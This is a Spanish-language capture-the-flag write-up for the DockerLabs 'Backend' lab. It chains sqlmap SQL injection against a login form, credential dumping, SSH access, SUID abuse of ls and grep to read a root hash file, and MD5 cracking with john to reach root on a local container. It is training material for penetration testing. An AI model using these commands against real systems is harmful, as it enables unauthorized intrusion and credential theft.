---
title: "DockerLabs - Backend"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar inyección SQL con sqlmap para volcar credenciales y acceder por SSH.

## Despliegue

```bash
bash auto_deploy.sh backend.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **22/tcp** — SSH (OpenSSH)
- **80/tcp** — HTTP (Apache 2.4.61 Debian)

## Enumeración Web

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

Directorios encontrados: `/login.php`, `/login.html`, `/index.html`

El formulario de login está en `login.html` y hace POST a `login.php`. Campos: `username` y `password`.

## Inyección SQL con sqlmap

```bash
# Listar bases de datos
sqlmap -u "http://172.17.0.2/login.php" --data="username=test&password=test" --level=5 --risk=3 --batch --dbs

# Listar tablas de users
sqlmap -u "http://172.17.0.2/login.php" --data="username=test&password=test" --level=5 --risk=3 --batch -D users --tables

# Volcar credenciales
sqlmap -u "http://172.17.0.2/login.php" --data="username=test&password=test" --level=5 --risk=3 --batch -D users -T usuarios --dump
```

Credenciales obtenidas:

| id | username | password |
|----|----------|----------|
| 1 | paco | $paco$123 |
| 2 | pepe | P123pepe3456P |
| 3 | juan | jjuuaann123 |

## Intrusión SSH

```bash
ssh pepe@172.17.0.2
# contraseña: P123pepe3456P
```

## Escalada de Privilegios

SUID en binarios no estándar:

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/grep  ← SUID
# /usr/bin/ls    ← SUID
```

```bash
ls /root/
# pass.hash

grep '' /root/pass.hash
# e43833c4c9d5ac444e16bb94715a75e4
```

Hash MD5. Crackeo con john:

```bash
echo "e43833c4c9d5ac444e16bb94715a75e4" > /tmp/hash_md5.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash_md5.txt
# spongebob34
```

```bash
su root
# contraseña: spongebob34
whoami
# root
```

## Conclusión

Cadena de ataque: SQLi con sqlmap → credenciales DB → SSH como pepe → SUID en `ls` y `grep` → `/root/pass.hash` → crackeo MD5 → root.
